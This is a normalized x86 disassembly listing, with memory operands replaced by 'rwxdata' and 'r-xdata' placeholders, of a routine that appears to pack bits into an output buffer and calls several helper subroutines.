mov eax [ ebp - 0xc ]
cmp eax [ rwxdata ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax * 4 + rwxdata ]
cmp ecx [ ebp - 0x3c ]
jne r-xdata
mov eax [ ebp - 0x14 ]
shl eax 0xf
mov ecx [ ebp - 0x54 ]
shl ecx 0xb
lea edx [ eax + ecx + rwxdata ]
mov eax [ ebp - 0x30 ]
shl eax 0x7
add edx eax
mov ecx [ ebp - 0x34 ]
mov eax [ ebp - 0xc ]
cmp eax [ edx + ecx * 8 ]
jge r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp - 0x10 ]
shl edx 0xe
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov edx [ ebp - 0x3c ]
mov [ ecx * 4 + rwxdata ] edx
mov eax [ rwxdata ]
mov [ ebp - 0x50 ] eax
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp - 0xc ]
mov [ ebp - 0x50 ] edx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
shl ecx 0xf
mov edx [ ebp - 0x54 ]
shl edx 0xb
lea eax [ ecx + edx + rwxdata ]
mov ecx [ ebp - 0x30 ]
shl ecx 0x7
add eax ecx
mov edx [ ebp - 0x34 ]
mov eax [ eax + edx * 8 + 0x4 ]
imul eax eax 0x1f40
mov ecx [ ebp - 0xc ]
mov edx [ eax + ecx * 4 + rwxdata ]
mov eax [ ebp - 0x50 ]
mov [ edx * 4 + rwxdata ] eax
jmp r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
shl ecx 0xf
sar ecx 0xf
and ecx 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov eax [ rwxdata ]
add eax 0x3
mov [ rwxdata ] eax
mov ecx [ rwxdata ]
sub ecx 0x1
shl ecx 0xe
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ rwxdata ]
sub eax 0x1
shl eax 0xf
sar eax 0xf
and eax 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov edx [ rwxdata ]
add edx 0x2
mov [ rwxdata ] edx
mov eax [ rwxdata ]
sub eax 0x1
shl eax 0xe
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ rwxdata ]
sub edx 0x1
shl edx 0xf
sar edx 0xf
and edx 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov ecx [ rwxdata ]
add ecx 0x2
mov [ rwxdata ] ecx
mov edx [ rwxdata ]
sub edx 0x1
shl edx 0xe
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ rwxdata ]
sub ecx 0x1
shl ecx 0xf
sar ecx 0xf
and ecx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov eax [ rwxdata ]
add eax 0x2
mov [ rwxdata ] eax
mov ecx [ rwxdata ]
sub ecx 0x1
shl ecx 0xe
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ rwxdata ]
sub eax 0x1
shl eax 0xf
sar eax 0xf
and eax 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov edx [ rwxdata ]
add edx 0x2
mov [ rwxdata ] edx
mov eax [ rwxdata ]
sub eax 0x1
shl eax 0xe
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ rwxdata ]
sub edx 0x1
shl edx 0xf
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ rwxdata ]
add ecx 0x2
mov [ rwxdata ] ecx
mov edx [ rwxdata ]
mov al [ rwxdata ]
mov [ edx + rwxdata ] al
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ rwxdata ]
mov al [ rwxdata ]
mov [ edx + rwxdata ] al
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ rwxdata ]
mov al [ rwxdata ]
mov [ edx + rwxdata ] al
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ rwxdata ]
mov al [ rwxdata ]
mov [ edx + rwxdata ] al
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ rwxdata ]
add edx 0x4
mov [ rwxdata ] edx
mov eax [ rwxdata ]
mov cl [ rwxdata ]
mov [ eax + rwxdata ] cl
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov eax [ rwxdata ]
mov cl [ rwxdata ]
mov [ eax + rwxdata ] cl
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov eax [ rwxdata ]
mov cl [ rwxdata ]
mov [ eax + rwxdata ] cl
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov eax [ rwxdata ]
mov cl [ rwxdata ]
mov [ eax + rwxdata ] cl
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov eax [ rwxdata ]
add eax 0x4
mov [ rwxdata ] eax
mov ecx [ rwxdata ]
mov dl [ rwxdata ]
mov [ ecx + rwxdata ] dl
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov ecx [ rwxdata ]
mov dl [ rwxdata ]
mov [ ecx + rwxdata ] dl
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov ecx [ rwxdata ]
mov dl [ rwxdata ]
mov [ ecx + rwxdata ] dl
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov ecx [ rwxdata ]
mov dl [ rwxdata ]
mov [ ecx + rwxdata ] dl
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov ecx [ rwxdata ]
add ecx 0x4
mov [ rwxdata ] ecx
mov edx [ rwxdata ]
mov al [ rwxdata ]
mov [ edx + rwxdata ] al
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ rwxdata ]
mov al [ rwxdata ]
mov [ edx + rwxdata ] al
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ rwxdata ]
mov al [ rwxdata ]
mov [ edx + rwxdata ] al
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ rwxdata ]
mov al [ rwxdata ]
mov [ edx + rwxdata ] al
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ rwxdata ]
add edx 0x4
mov [ rwxdata ] edx
mov eax [ rwxdata ]
mov cl [ rwxdata ]
mov [ eax + rwxdata ] cl
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov eax [ rwxdata ]
mov cl [ rwxdata ]
mov [ eax + rwxdata ] cl
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov eax [ rwxdata ]
mov cl [ rwxdata ]
mov [ eax + rwxdata ] cl
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov eax [ rwxdata ]
mov cl [ rwxdata ]
mov [ eax + rwxdata ] cl
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov eax [ rwxdata ]
add eax 0x4
mov [ rwxdata ] eax
mov [ rwxdata ] 0x0
mov ecx [ ebp - 0x8 ]
shl ecx 0x3
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
shl edx 0x5
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
shl ecx 0x6
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x7
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
shl edx 0x8
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
shl ecx 0x9
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0xa
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
shl edx 0xb
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
shl ecx 0xc
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0xd
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
shl edx 0xe
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
shl ecx 0xf
sar ecx 0xf
and ecx 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov eax [ rwxdata ]
add eax 0xd
mov [ rwxdata ] eax
mov ecx [ ebp - 0x3c ]
sub ecx 0x1
mov [ ebp - 0x3c ] ecx
mov edx [ ebp - 0x3c ]
shl edx 0xc
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp - 0x3c ]
shl ecx 0xd
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp - 0x3c ]
shl eax 0xe
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp - 0x3c ]
shl edx 0xf
sar edx 0xf
and edx 0x1
je r-xdata
cmp [ ebp - 0xc ] 0xfa0
jge r-xdata
mov ecx [ rwxdata ]
add ecx 0x4
mov [ rwxdata ] ecx
mov edx [ ebp - 0x3c ]
add edx 0x1
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x40 ] 0xffffffff
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x40 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ecx * 4 + rwxdata ] 0xffffffff
je r-xdata
mov [ ebp - 0x14 ] 0x0
mov ecx [ ebp - 0x40 ]
add ecx 0x2
mov edx [ ebp - 0x8 ]
sub edx ecx
mov [ ebp - 0x28 ] edx
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov eax [ ebp - 0x3c ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
call sub_401550
add esp 0x8
mov edx [ ebp - 0x40 ]
add edx 0x2
mov [ ebp - 0x28 ] edx
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x40 ] 0xffffffff
jne r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x30 ] 0x0
mov eax [ ebp - 0x14 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x28 ]
cmp ecx [ ebp - 0xc ]
jge r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
add eax 0x2
mov ecx [ ebp - 0xc ]
sub ecx eax
mov [ ebp - 0x28 ] ecx
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov edx [ ebp - 0xc ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov [ rwxdata ] 0x0
cmp [ rwxdata ] 0xc8
jge r-xdata
mov [ ebp - 0x30 ] 0x0
mov ecx [ ebp - 0x14 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov eax [ rwxdata ]
sub eax 0x1
cmp [ ebp - 0x14 ] eax
jne r-xdata
mov edx [ ebp - 0x30 ]
or edx 0x80
mov [ ebp - 0x30 ] edx
mov edx [ ebp - 0x28 ]
mov eax [ edx * 4 + rwxdata ]
push eax
call sub_401310
add esp 0x4
mov ecx [ rwxdata ]
add ecx 0x8
mov [ rwxdata ] ecx
jmp r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov eax [ ebp - 0xc ]
mov ecx [ eax * 4 + rwxdata ]
push ecx
call sub_4028e0
add esp 0x4
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov edx [ ebp - 0x3c ]
push edx
mov eax [ ebp - 0x28 ]
push eax
call sub_401550
add esp 0x8
mov ecx [ ebp - 0x40 ]
add ecx 0x2
mov [ ebp - 0x28 ] ecx
jmp r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx * 4 + rwxdata ]
push edx
call sub_4028e0
add esp 0x4
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov ecx [ ebp - 0x3c ]
push ecx
mov edx [ ebp - 0x28 ]
push edx
call sub_401550
add esp 0x8
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
cmp [ rwxdata ] 0x0
jne r-xdata
cmp [ ebp - 0x38 ] 0xffffffff
jne r-xdata
mov ecx [ rwxdata ]
sub ecx 0x1
cmp [ ebp - 0x14 ] ecx
jne r-xdata
mov eax [ ebp - 0x30 ]
or eax 0x80
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x28 ]
add eax 0x1
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
mov edx [ ebp - 0xc ]
mov [ ebp - 0x40 ] edx
mov ecx [ ebp - 0x28 ]
cmp ecx [ ebp - 0x40 ]
jge r-xdata
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
cmp [ rwxdata ] 0x0
jne r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ rwxdata ]
sub edx 0x1
cmp [ ebp - 0x14 ] edx
jne r-xdata
mov ecx [ ebp - 0x30 ]
or ecx 0x40
mov [ ebp - 0x30 ] ecx
mov ecx [ ebp - 0xc ]
mov edx [ ecx * 4 + rwxdata ]
push edx
call sub_4028e0
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x28 ]
mov edx [ ecx * 4 + rwxdata ]
push edx
call sub_401310
add esp 0x4
mov eax [ rwxdata ]
add eax 0x8
mov [ rwxdata ] eax
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx * 4 + rwxdata ]
push eax
call sub_4028e0
add esp 0x4
jmp r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ edx * 4 + rwxdata ]
push eax
call sub_401310
add esp 0x4
mov ecx [ rwxdata ]
add ecx 0x8
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ rwxdata ]
jge r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ rwxdata ]
jge r-xdata
mov edx [ rwxdata ]
sub edx 0x1
imul edx edx 0x18
mov eax [ rwxdata ]
imul eax eax 0x18
mov ecx [ edx + rwxdata ]
mov [ eax + rwxdata ] ecx
mov edx [ rwxdata ]
imul edx edx 0x18
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
sub eax 0x1
imul eax eax 0x18
mov ecx [ rwxdata ]
imul ecx ecx 0x18
mov edx [ eax + rwxdata ]
mov [ ecx + rwxdata ] edx
mov eax [ rwxdata ]
imul eax eax 0x18
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
sub ecx 0x1
imul ecx ecx 0x18
mov edx [ rwxdata ]
imul edx edx 0x18
mov eax [ ecx + rwxdata ]
mov [ edx + rwxdata ] eax
mov ecx [ rwxdata ]
imul ecx ecx 0x18
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov ecx [ rwxdata ]
imul ecx ecx 0x18
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
imul edx edx 0x18
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
imul eax eax 0x18
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
imul ecx ecx 0x18
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
imul edx edx 0x18
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
imul eax eax 0x18
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov eax [ rwxdata ]
sub eax 0x1
cmp [ ebp - 0x14 ] eax
jne r-xdata
mov edx [ ebp - 0x30 ]
or edx 0x40
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x28 ]
add edx 0x1
mov [ ebp - 0x28 ] edx
jmp r-xdata
mov eax [ ebp - 0x28 ]
add eax 0x1
mov [ ebp - 0x28 ] eax
mov [ rwxdata ] 0x0
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov [ ebp - 0x54 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ rwxdata ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx * 4 + rwxdata ]
mov [ eax * 4 + rwxdata ] edx
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov eax [ rwxdata ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax [ rwxdata ]
mov [ rwxdata ] eax
mov eax [ ebp - 0x38 ]
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ rwxdata ]
sub ecx 0x1
cmp [ ebp - 0x14 ] ecx
jne r-xdata
mov eax [ ebp - 0x30 ]
or eax 0x20
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x14 ]
cmp edx [ rwxdata ]
jge r-xdata
mov ecx [ ebp - 0x54 ]
cmp ecx [ rwxdata ]
jge r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ rwxdata ]
sub edx 0x1
cmp [ ebp - 0x14 ] edx
jne r-xdata
mov ecx [ ebp - 0x30 ]
or ecx 0x20
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x54 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x54 ]
cmp edx [ rwxdata ]
jne r-xdata
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x14 ]
mov ecx [ edx * 4 + rwxdata ]
cmp ecx [ eax * 4 + rwxdata ]
jne r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
jmp r-xdata
mov eax [ rwxdata ]
sub eax 0x1
cmp [ ebp - 0x14 ] eax
jne r-xdata
mov edx [ ebp - 0x30 ]
or edx 0x10
mov [ ebp - 0x30 ] edx
mov [ rwxdata ] 0x0
mov [ ebp - 0x30 ] 0x0
mov ecx [ ebp - 0x14 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov ecx [ ebp - 0x54 ]
cmp ecx [ rwxdata ]
jge r-xdata
jmp r-xdata
mov eax [ rwxdata ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx * 4 + rwxdata ]
mov [ eax * 4 + rwxdata ] edx
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
jmp r-xdata
mov ecx [ rwxdata ]
sub ecx 0x1
cmp [ ebp - 0x14 ] ecx
jne r-xdata
mov eax [ ebp - 0x30 ]
or eax 0x10
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ rwxdata ]
sub ecx 0x1
cmp [ ebp - 0x14 ] ecx
jne r-xdata
mov eax [ ebp - 0x30 ]
or eax 0x80
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x54 ]
cmp edx [ rwxdata ]
jne r-xdata
